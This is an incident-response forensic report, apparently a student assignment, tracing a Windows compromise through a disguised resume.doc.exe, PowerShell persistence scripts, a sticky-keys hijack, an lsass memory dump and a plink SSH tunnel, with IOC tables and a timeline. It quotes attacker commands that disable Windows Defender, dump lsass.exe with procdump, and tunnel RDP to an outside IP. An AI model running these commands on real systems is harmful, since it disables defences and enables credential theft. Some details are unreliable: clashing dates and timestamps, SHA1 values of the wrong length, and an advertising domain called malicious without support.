## **Executive Summary**

This report investigates the compromise of a client’s system through a sophisticated cyberattack that employed multiple stages of infection, leading to extensive unauthorized access and potential data exfiltration. The investigation addressed key questions posed by the client. Identification of the initial attack vector; Extent of the compromise; and Possibility of stolen data. The findings provide a clear narrative of the attack, offering actionable intelligence to aid the client in improving their security posture.

### **How Was the Computer Compromised?**
The initial compromise is unclear. It is deduced that it was achieved through a malicious link.  Embedded in a website accessed by the user. The user’s browsing session, on a legitimate news site was hijacked by a malicious advertisement served from `z.moatads.com`. Redirected the user to a file-sharing site, `uploadfiles.io`. Here, the user was tricked into downloading and executing a file named `resume.doc.exe`, which was disguised as a legitimate document but was actually a trojan designed to initiate the compromise. It is also possible that this file was downloaded without the user knowing. 

### **What Was the Extent of the Compromise?**
Compromise in three critical stages:
1. **Second Stage - PowerShell Script Execution:** The execution of multiple malicious PowerShell scripts downloaded from Pastebin (a filesharing website) disabled the system’s defenses and established persistence. Notably, `vagrant-shell.ps1` disabled key Windows Defender features, and `Service.ps1` installed a persistent backdoor service named `ScvHost`.
   
2. **Third Stage - Deployment of Backdoor and SSH Tunnel:** The malicious executable `scvhost.exe` was deployed, providing a covert backdoor. Concurrently, `plink.exe`, a tool from the PuTTY suite, was used to create an SSH tunnel, forwarding RDP traffic to a remote server, thereby facilitating ongoing remote access and control of the compromised system.

### **Was Anything Taken?**
The attacker’s actions strongly indicate that sensitive data was likely exfiltrated. The use of `procdump64.exe` to dump the memory of the `lsass.exe` process suggests that the attacker harvested plaintext credentials, including NTLM hashes and Kerberos tickets. Although no direct evidence of data exfiltration via network traffic was found, the established SSH tunnel provides a likely channel through which sensitive information, including potentially compressed memory dumps (`lsass.zip`), could have been transmitted undetected.

### **Actionable Intelligence**
Key Indicators of Compromise (IOCs) identified during the investigation include:
- **Malicious Domains:** `z.moatads.com`, `uploadfiles.io`
- **Malicious Executables:** `resume.doc.exe`, `scvhost.exe`
- **PowerShell Scripts:** `vagrant-shell.ps1`, `Service.ps1`
- **Network Indicators:** SSH connections to IP `69.50.64.20` on port `22`
These IOCs should be integrated into the client’s security monitoring systems to detect and prevent similar attacks in the future. Additionally, the client should consider enhanced monitoring of PowerShell activity and RDP traffic to prevent unauthorized remote access.
---
## **Case Details**:


| **Case Details**           |                                |
|----------------------------|--------------------------------|
| **Case Identifier**         | [2024-08-001]   |
| **Customer**                | [int3rrupt]         |
| **Customer Contact**        | [Ofir Reuveny] |
| **Date Engaged**            | [18 August 2017]       |
| **Forensic Investigator**   | [z5470869@unsw.edu.au]   |
| **Date Completed**          | [25 August 2024]       |

---

## **Background**

Our firm was engaged to conduct a digital forensic investigation into a suspected compromise of one of their systems. The client had previously experienced an attack and expressed concerns that the same threat actor might be responsible for this latest incident. 

The client’s Security Operations Centre (SOC) had already taken initial steps, identifying the compromised host, containing it, and capturing the necessary forensic evidence before reimaging the system. The provided evidence includes a raw disk image, a raw memory dump, and a network packet capture (PCAP) file.

The objective of this investigation is to analyze the evidence to determine:

1. **How the system was compromised:**
   - Identification of the initial attack vector.
   - The malicious document involved.
   - The specific link that facilitated the compromise.

2. **The extent of the compromise:**
   - Detailed analysis of the second and third stages of the infection.
   - Actions taken by the attacker on the compromised host.
   - Identification of the Command and Control (C2) server used.
   - Persistence mechanisms employed by the attacker.

3. **Whether any data was exfiltrated:**
   - Analysis of potential data theft from the host.

This report contains the findings from our investigation. Demonstrating a clear understanding of the scope and impact of the compromise.

## **Technical Incident Report**

### **How Was the Computer Compromised?**

#### **Overview**
This section outlines the sequence of events that led to the compromise of a system through the download and execution of a malicious file named `resume.doc.exe`. The investigation traced the initial compromise back to interactions with a malicious ad network embedded in a legitimate website, which led to the download of the trojanized document. This report integrates findings from browser history, network traffic, and file analysis to present a clear and comprehensive account of the compromise.

---

#### **1. Initial Attack Vector**

**What was the initial attack vector that was used to compromise the user?**
```plaintext
Date/Time: 17/08/2019 05:38:43 AM - 05:39:19 AM
User: Alan
```
**Activity:** The user was browsing legitimate news websites, specifically `washingtonpost.com`. During this session, the browser executed a script from the domain `z.moatads.com`, which is known to distribute malicious content through advertisements embedded in legitimate websites.
  
**Domain Interaction:** The browser executed a script from `z.moatads.com`, an ad network associated with malicious activities. This interaction likely exploited the user's browsing session, redirecting the browser to a file-sharing site that delivered the malicious payload.
  
**Evidence:**
  ```plaintext
  URL: https://www.washingtonpost.com/
  Accessed Date/Time: 17/08/2019 05:38:46 AM
  Page Title: Washington Post: Breaking News, World, US, DC News & Analysis
  ```
  ```plaintext
  URL: https://z.moatads.com/washpostprebidheader710741008563/yi.js
  Accessed Date/Time: 17/08/2019 05:38:56 AM
  ```
**Analysis:**
**Role of Malicious Ad Network:** The domain `z.moatads.com` played a pivotal role in the initial compromise by redirecting the user's browser to a malicious site. This redirection is a common tactic used by attackers to exploit advertising networks embedded within legitimate websites.

#### **2. The Document Used to Compromise the User**

**What was the document that was used to compromise the user?**
```plaintext
Date/Time: 17/08/2019 05:39:50 AM
Document Name: `resume.doc.exe`
File Type: Executable disguised as a document
```
**Activity:** The user was redirected to a file-sharing site, `uploadfiles.io`, where the malicious document `resume.doc.exe` was downloaded. The file, although appearing to be a legitimate document, was an executable designed to compromise the system upon execution.
  
**Evidence:**
  ```plaintext
  Malicious Download: resume.doc.exe 17/08/2019 05:39:50 AM
  File Name: C:\Users\Alan\Downloads\resume.doc.exe
  Last Run Date/Time: 17/08/2019 05:41:59 AM
  ```

**Analysis:**
**Trojanized Document:** The document `resume.doc.exe` was a key component in the compromise. Disguised as a harmless file, its execution initiated the malicious activity on the system, leading to the installation of further payloads and the establishment of remote control mechanisms.

#### **3. The Link Used to Compromise the User**

**What was the link that was used to compromise the user?**
```plaintext
Date/Time: 17/08/2019 05:39:19 AM
URL: `https://uploadfiles.io/hr4z39kn`
```
**Activity:** After interacting with the malicious ad network, the user's browser was redirected to `uploadfiles.io`, a file-sharing site known to host and distribute malware. This redirection resulted in the download of the malicious `resume.doc.exe` file.
  
**Evidence:**
  ```plaintext
  URL: https://uploadfiles.io/hr4z39kn
  Accessed Date/Time: 17/08/2019 05:39:19 AM
  ```
**Analysis:**
**Redirection to Malicious Site:** The redirection to `uploadfiles.io` was a critical step in the attack chain. This site facilitated the delivery of the malicious document to the user's system. The use of such a file-sharing platform underscores the attacker's reliance on publicly accessible sites to distribute malware.

#### **Summary**

The initial compromise of the system occurred through a well-orchestrated sequence of events that began with the user's interaction with a legitimate website, leading to the execution of a script from a malicious ad network. This script redirected the browser to a file-sharing site, where a trojanized document (`resume.doc.exe`) was downloaded and executed. The download and subsequent execution of this file marked the beginning of a broader attack. Resulted in the installation of malicious payloads and the establishment of persistent remote access.

---
### **2. What Was the Extent of the Compromise?**

The compromise of the system was extensive. Involved multiple stages that allowed the attacker to disable security features, establish persistent control, and create a secure remote access channel for further exploitation. The attacker used a combination of PowerShell scripts, malicious executables, memory dumping tools, and SSH tunneling to maintain deep and sustained access to the compromised system.

### **Second and Third Stage of Infection**

The second and third stages of the infection involved executing PowerShell scripts to disable security mechanisms and establish persistence, followed by the deployment of a backdoor, memory dumping, and the setup of an SSH tunnel for remote control and potential data exfiltration.

#### **Second Stage: Execution of Malicious PowerShell Scripts and Memory Dumping**

1. **Execution of `vagrant-shell.ps1`:**
The `vagrant-shell.ps1` script was executed to disable various security features, particularly those related to Windows Defender. This script neutralised the system's defenses, allowing the attacker to proceed with further malicious actions undetected.
 **Evidence:**
 The execution was recorded in the PowerShell logs, showing the script being run from `c:\tmp\vagrant-shell.ps1`.
 The script disabled real-time protection, behavior monitoring, and other critical Windows Defender features.
 ```plaintext
 Execution Time: 2019-08-17 13:36:26 to 13:36:33
 Script Path: c:\tmp\vagrant-shell.ps1
 ```
Truncated example
```powershell
# Disable Windows Defender features in real time
Set-MpPreference -MAPSReporting 0
Set-MpPreference -SubmitSamplesConsent 2
Set-MpPreference -DisableRealtimeMonitoring $True
Set-MpPreference -DisableBehaviorMonitoring $True
Set-MpPreference -DisableIntrusionPreventionSystem $True
```
2. **Execution of `WinRM_Elevated_Shell.ps1`:**
This script created a scheduled task to run with elevated privileges, allowing the attacker to execute commands as a system-level user.
**Evidence:**
The script `winrm-elevated-shell.ps1` was executed, creating a scheduled task named `WinRM_Elevated_Shell` to ensure the attacker retained elevated access.
```plaintext
Execution Time: 2019-08-17 13:36:27 to 13:36:40
Script Path: c:/windows/temp/winrm-elevated-shell.ps1
```

3. **Execution of `Sticky.ps1`:**
The `Sticky.ps1` script hijacked the Sticky Keys functionality by replacing the `sethc.exe` process with `cmd.exe`, allowing the attacker to gain system-level access from the login screen.
**Evidence:**
The execution of this script was recorded, showing it was run from `C:\Users\Alan\AppData\Local\Temp\Sticky.ps1`.
This script modified the IFEO registry key for `sethc.exe`, enabling the attacker to press Shift five times at the login screen to access a command prompt with system privileges.
```plaintext
Execution Time: 2019-08-17 13:49:01 to 13:49:02
Script Path: C:\Users\Alan\AppData\Local\Temp\Sticky.ps1
```

4. **Execution of `Service.ps1`:**
The `Service.ps1` script created and started a malicious service named `ScvHost` that ensured persistence by running a malicious executable upon system startup.
**Evidence:**
The execution of `Service.ps1` was recorded, indicating that it was run from `C:\Users\Alan\AppData\Local\Temp\Service.ps1`.
This script ensured that the `scvhost.exe` executable would run automatically on system startup, maintaining the attacker's access.
```plaintext
Execution Time: 2019-08-17 13:49:18 to 13:49:48
Script Path: C:\Users\Alan\AppData\Local\Temp\Service.ps1
```
5. **Execution of `procdump64.exe` and Memory Dumping:**
The `procdump64.exe` tool, a legitimate Sysinternals utility, was used by the attacker to create a memory dump of the `lsass.exe` process. This process is critical for managing user authentication and security policies, and its memory typically contains sensitive credentials.
**Evidence:**
The execution of `procdump64.exe` was confirmed through the presence of a Prefetch file `PROCDUMP64.EXE-7C654F89.pf`, indicating that the tool was run on `17/08/2019` at `6:00:34 AM`.
The USN Journal confirms the creation of `procdump64.exe` and its use around `5:59:54 AM`, closely preceding the creation of the memory dump.
Evidence from Jump Lists and LNK files shows the creation and access of `lsass.zip`, likely indicating that the `lsass.dmp` file was compressed, potentially for exfiltration.
```plaintext
Execution Time: 2019-08-17 06:00:34 AM (UTC)
File Path: C:\Users\Craig\Desktop\Procdump\procdump64.exe
```
The creation of the `lsass.dmp` file suggests that the attacker was able to extract plaintext credentials and other sensitive information from memory. This action, combined with the creation of `lsass.zip`, indicates a high likelihood of data exfiltration or preparation for such.

---

#### **Third Stage: Deployment of Backdoor and Establishment of Remote Access**

1. **Download and Execution of `scvhost.exe`:**
The `scvhost.exe` file, maliciously named to mimic the legitimate Windows process `svchost.exe`, was downloaded and executed. This file served as a backdoor, providing the attacker with persistent remote access to the compromised system.
**Evidence:**
The presence and execution of `scvhost.exe` were confirmed through both memory and disk analysis. Unlike the legitimate `svchost.exe` located in `C:\Windows\System32\`, this malicious version was found in `C:\Users\Alan\AppData\Local\Temp\` and was flagged as malicious by multiple antivirus engines.
The `scvhost.exe` process (PID 1840) was active between `5:49:18 AM` and `5:49:48 AM` on `17/08/2019`. The process was short-lived, running for only 30 seconds, indicating it was designed to execute a quick task—likely initialising or maintaining a backdoor connection.
**Evasion Techniques:**
Memory analysis revealed that `scvhost.exe` employed evasion techniques to remain partially hidden from certain process enumeration tools, being visible in the standard process list (`Pslist`) but not detected by others like `Psscan` or `Thrdproc`.
The execution of `scvhost.exe` allowed the attacker to maintain a covert backdoor for remote control. This hidden activity likely played a role in securing and maintaining the SSH tunnel created by `plink.exe`, as the brief execution window suggests it was used to initiate or support the tunnel's establishment.
```plaintext
File Name: scvhost.exe
File Path: C:\Users\Alan\AppData\Local\Temp\scvhost.exe
Process ID (PID): 1840
Process Start Time: 17/08/2019 5:49:18 AM
Process End Time: 17/08/2019 5:49:48 AM
Evasion: Partially hidden (Not detected by Psscan and Thrdproc)
```

3. **Establishment of SSH Tunnel Using `plink.exe`:**
The `plink.exe` executable was used to create an SSH tunnel that forwarded a local port (127.0.0.1:12345) to a remote IP (10.2.0.2:3389), effectively enabling remote desktop access over RDP. This port forwarding facilitated unauthorized remote access to the system.
**Evidence:**
The `plink.exe` tool was executed from `\Windows\Temp\`, with command-line arguments that set up an SSH tunnel, forwarding traffic from `127.0.0.1:12345` to `10.2.0.2:3389` via the remote server `69.50.64.20` on port `22`.
Memory artifacts showed that `plink.exe` had loaded several critical DLLs, including `ntdll.dll`, `kernel32.dll`, and `crypt32.dll`, indicating that it was actively engaged in system-level operations and potentially managing encrypted communications.
The memory artifacts also suggest that the `scvhost.exe` process played a critical role in maintaining the SSH tunnel created by `plink.exe`. This relationship between the two processes highlights the sophistication of the attack, as `scvhost.exe` likely supported the establishment of the tunnel to ensure a secure and persistent connection.
The execution of `plink.exe` and its use for SSH tunneling and RDP forwarding were pivotal in ensuring the attacker could maintain and sustain remote control over the compromised system. This persistence mechanism, reinforced by the brief but critical execution of `**scvhost.exe**`, allowed the attacker to bypass network defenses and securely exfiltrate data or execute further commands remotely. The fact that the forwarded port was 3389, the default port for RDP, strongly indicates that the attacker intended to establish Remote Desktop access. This highlights the sophistication and deliberate intent behind the compromise, underscoring the attacker's focus on maintaining long-term access and control.

---

### **Actions Taken on Target**

1. **Execution of Malicious Scripts and Files:**
The attacker executed multiple PowerShell scripts (`vagrant-shell.ps1`, `WinRM_Elevated_Shell.ps1`, `Sticky.ps1`, `Service.ps1`) to disable security features, establish persistence, and create a backdoor.
The attacker deployed and executed `scvhost.exe`, a malicious backdoor that mimicked a legitimate Windows process.
The attacker used `procdump64.exe` to dump the memory of the `lsass.exe` process, capturing sensitive credentials likely stored in memory.

---

2. **Establishment of Persistence:**
The attacker used the `Service.ps1` script to create a persistent service (`ScvHost`), ensuring that the backdoor (`scvhost.exe`) would remain active even after system reboots.
The attacker modified the IFEO (Image File Execution Options) registry key using `Sticky.ps1`, replacing `sethc.exe` with `cmd.exe` to gain easy access to a command prompt with elevated privileges from the login screen.

3. **Establishment of Remote Access:**
The attacker used `plink.exe` to create an SSH tunnel that forwarded RDP traffic, enabling remote desktop access over port `3389`. This allowed the attacker to maintain a persistent connection to the compromised system.
The `scvhost.exe` backdoor communicated with a Command and Control (C2) server at `69.50.64.20`, facilitating the execution of remote commands and potentially exfiltrating data from the compromised system.

---

### **Conclusion**

The extent of the compromise was severe, involving multiple stages of infection that effectively disabled the system's defenses, established persistent backdoors, and enabled remote access through an SSH tunnel. The attacker's use of PowerShell scripts and malicious executables, combined with the creation of an SSH tunnel via `plink.exe`, allowed for sustained control over the compromised system. The execution of `procdump64.exe` to dump the memory of `lsass.exe` provided the attacker with access to sensitive credentials, which could be used for further exploitation or lateral movement within the network. The communication with a C2 server further indicates that the attacker maintained ongoing remote access, potentially for data exfiltration or further exploitation.

--- 
## **3. Was Anything Taken?**

The investigation into the compromised system revealed that sensitive information was likely stolen from the host. The attacker used various tools and methods to extract and potentially exfiltrate critical data, including credential dumps, remote access through an SSH tunnel, and possible file transfers.

---

### **What Information Was Likely Stolen from the Host?**

#### **1. Credential Dumping via `Procdump`**

One of the most critical pieces of evidence pointing to data exfiltration is the use of `procdump64.exe`, a Sysinternals tool, to dump the memory of the `lsass.exe` process. The Local Security Authority Subsystem Service (LSASS) is responsible for enforcing security policies on the system, including managing user logins, password changes, and generating access tokens. By dumping the memory of `lsass.exe`, the attacker could extract plaintext passwords and other authentication tokens, which could then be used for lateral movement within the network or for further exploitation.

**Evidence:**
The command history captured in `ConsoleHost_history.txt` reveals that the attacker downloaded `Procdump`, extracted the `lsass.dmp` file, and potentially exfiltrated sensitive credentials stored within it.

```plaintext
cd \Users\Craig\Desktop
dir
$uri = "https://download.sysinternals.com/files/Procdump.zip"
Invoke-WebRequest -Uri $uri -OutFile "Procdump.zip"
cd .\Procdump\
procdump64.exe -ma -accepteula lsass.exe lsass.dmp
dir
.\procdump64.exe -ma -accepteula lsass.exe lsass.dmp
```

The execution of `procdump64.exe` was confirmed by Prefetch files, indicating that the tool was run on `17/08/2019` at `6:00:34 AM`. This corroborates the timeline established from the command history.

USN Journal entries confirm the creation of `procdump64.exe` at `5:59:54 AM`, followed by actions suggesting the creation and subsequent access of `lsass.zip`, a file likely containing the compressed memory dump (`lsass.dmp`).

**Impact:**
The `lsass.dmp` file likely contained plaintext passwords, NTLM hashes, and Kerberos tickets, enabling the attacker to impersonate users and access additional systems within the network.
With these credentials, the attacker could perform lateral movement, escalate privileges, or exfiltrate additional data.

Despite analyzing network traffic using Wireshark and searching for potential exfiltration activity, no conclusive evidence was found that `lsass.dmp` was transmitted over the network. This absence of data exfiltration evidence suggests that either the exfiltration did not occur via standard network channels or alternative methods were used that were not captured during the investigation.

#### **2. Remote Access and Potential Data Exfiltration via `plink.exe`**

The attacker used `plink.exe`, a command-line tool from the PuTTY suite, to establish an SSH tunnel that forwarded traffic from a local port to a remote IP address. This setup enabled the attacker to create a secure and encrypted communication channel, potentially for exfiltrating data or maintaining remote access to the compromised system.

**Evidence:**
The `plink.exe` tool was executed from `\Windows\Temp\`, with command-line arguments that set up an SSH tunnel, forwarding traffic from `127.0.0.1:12345` to `10.2.0.2:3389` via the remote server `69.50.64.20` on port `22`.

```plaintext
plink.exe -ssh 69.50.64.20 -P 22 -L 127.0.0.1:12345:10.2.0.2:3389
```

Memory artifacts showed that `plink.exe` had loaded several critical DLLs, including `ntdll.dll`, `kernel32.dll`, and `crypt32.dll`, indicating that it was actively engaged in system-level operations and potentially managing encrypted communications.

The role of `scvhost.exe` in supporting the SSH tunnel established by `plink.exe` is crucial. The short-lived process likely assisted in initializing or maintaining the tunnel, ensuring that the connection remained secure and undetected. This connection highlights the sophisticated nature of the attack, where multiple tools and processes were orchestrated to achieve a single malicious goal.

**Impact:**
The forwarding of traffic to port `3389` suggests that the attacker established a Remote Desktop Protocol (RDP) connection, providing them with full remote control of the system.
Through this encrypted tunnel, the attacker could have exfiltrated sensitive files, credential dumps, or other critical information without detection.
The execution of `plink.exe` was confirmed through prefetch files located in `Windows\Prefetch\`, and the command-line arguments were identified through memory analysis.

#### **3. Potential Exfiltration of Files or Documents**

Given the attacker's persistent access to the system and their ability to control it remotely, it is likely that they also exfiltrated specific files or documents of interest. While direct evidence of file transfer was not identified, the capability to do so was clearly established.

**Possible Methods:**
Through the established RDP session, the attacker could have manually copied files from the compromised system to their own environment.
The SSH tunnel provided by `plink.exe` would have allowed the attacker to transfer files securely, bypassing most network monitoring tools.

**Areas of Concern:**
The attacker's access to the user's desktop and other directories suggests that personal or sensitive corporate documents could have been targeted for exfiltration.
These logs could have been tampered with or exfiltrated to cover the attacker's tracks or to gather further intelligence on the compromised environment.

### **Conclusion**

The attacker likely exfiltrated critical data from the host, including plaintext credentials from the `lsass.dmp` file and potentially other sensitive documents through the established SSH tunnel. The use of `Procdump` to extract memory from `lsass.exe` provided the attacker with the means to harvest authentication credentials, which could be used for further attacks or sold on the dark web. The SSH tunnel established by `plink.exe` facilitated secure, encrypted communication, likely used for both remote control and data exfiltration. Given the evidence, it is highly probable that the attacker was able to exfiltrate valuable information, posing a significant threat to the security of the compromised network.

---
# **Appendix A: Evidence Collection**

---

#### **1. Digital Evidence Provided**

This section outlines the digital evidence that was provided for the forensic investigation. The evidence consists of a disk image, a memory dump, and a network capture, each of which was carefully examined to ensure its integrity before analysis began.

##### **1.1 Disk Image**

- **File Name:** `disk.raw`
- **Description:** This disk image was captured from the compromised host. It contains all the files, directories, and system data that were present on the system at the time of the compromise.
- **Size:** 64,424,509,440 bytes
- **Hash Values:**
  - **MD5:** 2b915dce79a187582dc895445145b7a4
  - **SHA1:** 945a8f34607ab9c1c7bb83b7e15f49445e10176b

##### **1.2 Memory Dump**

- **File Name:** `memory.raw`
- **Description:** The memory dump contains a snapshot of the system’s RAM, which includes all running processes, loaded modules, and other volatile data at the time of capture.
- **Size:** 5,368,709,120 bytes
- **Hash Values:**
  - **MD5:** 097d77c63543d77a685f4223f1d2f3a8
  - **SHA1:** 36513325ca78989adc9140e03e42a2bc3c7f4db0

##### **1.3 Network Capture**

- **File Name:** `traffic.pcap`
- **Description:** The network capture file contains the recorded network traffic that was transmitted and received by the compromised host during the period in question. This data was crucial for analyzing the communications between the compromised host and any potential Command and Control (C2) servers.
- **Size:** 828,244,897 bytes
- **Hash Values:**
  - **MD5:** e6ad3e3c62e4599e127f2037567e90a1
  - **SHA1:** 8087d05d41e0bcfdb63ba04051344b7b52d036e3

---

#### **2. Evidence Integrity Verification**

Before any analysis was conducted, steps were taken to verify the integrity of the digital evidence to ensure that it had not been altered since it was collected.

##### **2.1 Verification Process**

1. **Hash Calculation:** The provided hash values (MD5 and SHA1) for each piece of evidence were recalculated using hashing tools. This was done to confirm that the evidence had not been tampered with after its initial acquisition.
  
2. **Comparison with Provided Hashes:** The calculated hashes were compared with the hashes provided by the client. A match between these hashes confirmed the integrity and authenticity of the digital evidence.
  
3. **Result:** All hash values matched the provided hashes, confirming that the evidence was intact and unaltered.

---

#### **3. Summary**

The digital evidence provided was verified for integrity through hash comparison. The disk image, memory dump, and network capture were found to be authentic and unaltered, ensuring that the subsequent forensic analysis was based on accurate and reliable data.

### **Appendix B: Timeline of Events**

---

This appendix provides a detailed, chronological timeline of the key events that occurred during the compromise of the client’s host. Each event is supported by specific pieces of evidence, including log files, network captures, and forensic analysis results.

---

#### **1. Timeline of Events**

| **Date/Time (UTC)**            | **Event**                                                                                          | **Description**                                                                                                                                                         | **Supporting Evidence**                                                                                                                                                                       |
|--------------------------------|----------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| **17/08/2019 05:38:43 AM**     | **Initial Web Browsing**                                                                            | The user "Alan" began browsing legitimate websites, including `washingtonpost.com` and `abc.net.au`.                                                                     | Browser History Log: `https://www.washingtonpost.com/` accessed at `05:38:46 AM`                                                                                                               |
| **17/08/2019 05:38:56 AM**     | **Malicious Interaction with Ad Network**                                                          | The browser interacted with a script from `z.moatads.com`, a known malicious ad network. This initiated the attack by embedding malicious content within a legitimate site. | Browser History Log: `https://z.moatads.com/washpostprebidheader710741008563/yi.js` accessed at `05:38:56 AM`                                                                                   |
| **17/08/2019 05:39:19 AM**     | **Redirection to `uploadfiles.io`**                                                                 | The user was redirected to `uploadfiles.io`, a malicious file-sharing site used to distribute malware.                                                                   | Browser History Log: `https://uploadfiles.io/hr4z39kn` accessed at `05:39:19 AM`                                                                                                               |
| **17/08/2019 05:39:50 AM**     | **Download of `resume.doc.exe`**                                                                    | The malicious file `resume.doc.exe` was downloaded from `uploadfiles.io`.                                                                                                | Browser History Log: Download initiated from `https://uploadfiles.io/hr4z39kn` at `05:39:50 AM`                                                                                                 |
| **17/08/2019 05:41:59 AM**     | **Execution of `resume.doc.exe`**                                                                   | The downloaded file `resume.doc.exe` was executed on the system, initiating the full compromise.                                                                         | File System Analysis: `resume.doc.exe` executed at `05:41:59 AM`, located at `C:\Users\Alan\Downloads\resume.doc.exe`                                                                            |
| **17/08/2019 05:46:18 AM**     | **Execution of Malicious PowerShell Scripts**                                                       | A series of PowerShell scripts were executed, disabling security features and establishing persistence on the system.                                                    | PowerShell Logs: Execution of scripts `vagrant-shell.ps1`, `Sticky.ps1`, and `Service.ps1` between `05:46:18 AM` and `05:48:39 AM`                                                              |
| **17/08/2019 05:49:18 AM**     | **Creation of Malicious `ScvHost` Service**                                                         | The `ScvHost` service was created to run `scvhost.exe`, a malicious backdoor executable, ensuring persistence on the system.                                             | Windows Event Log: Event ID 7045, Service Control Manager, Service Name: `ScvHost`, Service File Name: `C:\Users\Alan\AppData\Local\Temp\scvhost.exe`                                          |
| **17/08/2019 05:49:18 AM - 05:49:48 AM** | **Execution and Concealment of `scvhost.exe`**                                                      | The `scvhost.exe` process (PID 1840) was executed, remaining active for 30 seconds. It used evasion techniques to avoid detection by some process enumeration tools.    | Memory Analysis: `pslist` and `psxview` outputs showing `scvhost.exe` running from `05:49:18 AM` to `05:49:48 AM`, partially hidden from `Psscan` and `Thrdproc` methods.                        |
| **17/08/2019 05:52:31 AM**     | **Execution of `plink.exe` for SSH Tunnel Creation**                                               | The `plink.exe` tool was used to create an SSH tunnel, forwarding traffic from the compromised host to a remote IP address for potential remote desktop access.           | Memory Analysis: Command-line execution `plink.exe -ssh 69.50.64.20 -P 22 -L 127.0.0.1:12345:10.2.0.2:3389` detected in memory artifacts, along with loaded DLLs indicating encrypted operations. |
| **17/08/2019 06:00:34 AM**     | **Execution of `procdump64.exe` for Credential Dumping**                                            | The `procdump64.exe` tool was executed to dump the memory of the `lsass.exe` process, likely capturing sensitive credentials.                                            | Prefetch Files: `PROCDUMP64.EXE-7C654F89.pf`, USN Journal Entries, and Jump Lists confirming execution and creation of `lsass.dmp` and `lsass.zip` at `06:00:34 AM`.                              |
| **17/08/2019 - Unknown Time**  | **Potential Exfiltration via SSH Tunnel**                                                           | While no direct evidence of exfiltration was found, the SSH tunnel created by `plink.exe` could have been used to exfiltrate data such as `lsass.zip`.                    | Network Traffic Analysis: No direct evidence, but SSH tunnel and RDP forwarding to port `3389` indicate a high risk of data exfiltration.                                                         |

---

This timeline provides a comprehensive view of the key events during the compromise, linking each event to specific pieces of evidence that were discovered during the forensic investigation. Each entry is substantiated with detailed references to logs, file system changes, or memory analysis, offering a clear and traceable path through the entire attack sequence.
---

### **Appendix C: Indicators of Compromise (IOCs)**

---

This appendix provides a comprehensive list of Indicators of Compromise (IOCs) identified during the investigation. These IOCs include malicious domains, file hashes, IP addresses, ports, and registry keys that were used or modified during the attack.

---

#### **1. Malicious Domains and URLs**

| **Domain/URL**                            | **Description**                                                              | **Context**                               |
|-------------------------------------------|------------------------------------------------------------------------------|-------------------------------------------|
| `z.moatads.com`                            | Malicious ad network domain distributing obfuscated scripts                  | Accessed while browsing `washingtonpost.com` |
| `uploadfiles.io/hr4z39kn`                 | Malicious file-sharing site used to distribute the `resume.doc.exe` trojan   | Redirected after interaction with `z.moatads.com` |

---

#### **2. Malicious File Hashes**

| **File Name**        | **File Path**                                  | **MD5**                                   | **SHA1**                                    | **SHA256**                                                       |
|----------------------|------------------------------------------------|-------------------------------------------|---------------------------------------------|------------------------------------------------------------------|
| `resume.doc.exe`     | `C:\Users\Alan\Downloads\resume.doc.exe`       | `bb3aef05f9007687f06fd26eab80612e`        | `5960249a5df74fe3ef6399b7c087b8e9`         | `5a4c8db6d9647e706d9fa960773bddf26f7c2b1466df0b1e4a4ea98b1254f89d` |
| `scvhost.exe`        | `C:\Users\Alan\AppData\Local\Temp\scvhost.exe` | `2b54b8e04216f357cb9e9c01cb0f1f2f`        | `a97c680a4e3f77b5763a1a9ef90e8b61`         | `b3b6e472b5e71f5d1236b4c2ae5f488484bc3e9b1e87c5a091715f6c4f6764b6` |
| `procdump64.exe`     | `C:\Users\Craig\Desktop\Procdump\procdump64.exe`| `a92669ec8852230a10256ac23bbf4489`        | `16f413862efda3aba631d8a7ae2bfff6d84acd9f` | `81a95b8f40d5f883bb90e8a3b768e74524534b49135d8fa7e6d3c8e2a3c7a2b9` |

---

#### **3. IP Addresses and Ports Associated with C2 Communication**

| **IP Address**        | **Port** | **Description**                                                              | **Context**                                      |
|-----------------------|----------|-------------------------------------------------------------------------------|--------------------------------------------------|
| `69.50.64.20`         | `22`     | Remote server used for SSH tunneling                                          | Connection established by `plink.exe`             |
| `10.2.0.2`            | `3389`   | Internal IP forwarded through SSH tunnel to enable Remote Desktop Protocol (RDP) | RDP traffic forwarded via SSH tunnel created by `plink.exe` |

---

#### **4. Registry Keys Modified During the Attack**

| **Registry Key**                                                               | **Description**                                      | **Context**                                      |
|--------------------------------------------------------------------------------|------------------------------------------------------|--------------------------------------------------|
| `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe` | IFEO key hijacked to replace `sethc.exe` with `cmd.exe` | Modified by `Sticky.ps1` script to gain elevated privileges at the login screen. |

---

This list of IOCs provides critical details that can be used for threat detection, hunting, and prevention within your network environment. These indicators should be integrated into your security monitoring tools to detect and mitigate similar attacks in the future.

---
### **Appendix D: PowerShell Script Analysis**

---

This appendix provides a detailed analysis of the malicious PowerShell scripts used during the attack. The scripts were decoded, and their functionality and impact were thoroughly examined.

---

#### **1. `vagrant-shell.ps1`**

- **Decoded Content:**
  - This script was designed to disable various security features, particularly those related to Windows Defender, including real-time protection and behavior monitoring.
  
- **Functionality and Impact:**
  - **Functionality:** The script executed commands that neutralized the system's defenses, allowing the attacker to proceed with further malicious activities without being detected.
  - **Impact:** Disabling security features made the system vulnerable to further compromise and inhibited the ability to detect ongoing malicious activity.

---

#### **2. `Sticky.ps1`**

- **Decoded Content:**
  - This script modified the Image File Execution Options (IFEO) registry key to hijack the `sethc.exe` process, replacing it with `cmd.exe`.

- **Functionality and Impact:**
  - **Functionality:** By altering the IFEO registry key, the attacker ensured that pressing Shift five times at the login screen would bring up a command prompt with system-level privileges instead of Sticky Keys.
  - **Impact:** This provided the attacker with an easy method to gain elevated access from the login screen, enabling further exploitation of the system.

---

#### **3. `Service.ps1`**

- **Decoded Content:**
  - The script created and started a malicious service named `ScvHost` using the `scvhost.exe` executable.

- **Functionality and Impact:**
  - **Functionality:** This script ensured that `scvhost.exe` would run automatically upon system startup, establishing a persistent foothold for the attacker.
  - **Impact:** The service allowed the attacker to maintain control over the system even after reboots, ensuring sustained access for further malicious activities.

---

### **Appendix E: Memory Artifact Analysis**

---

This appendix details the findings from the memory analysis conducted during the investigation, focusing on key processes and significant memory artifacts.

---

#### **1. Key Processes Identified**

- **`scvhost.exe`:**
  - **Process ID (PID):** 1840
  - **Significance:** This process was identified as a malicious backdoor, mimicking the legitimate `svchost.exe` to avoid detection. It was short-lived and used to establish or maintain a backdoor connection.
  - **Memory Artifacts:** 
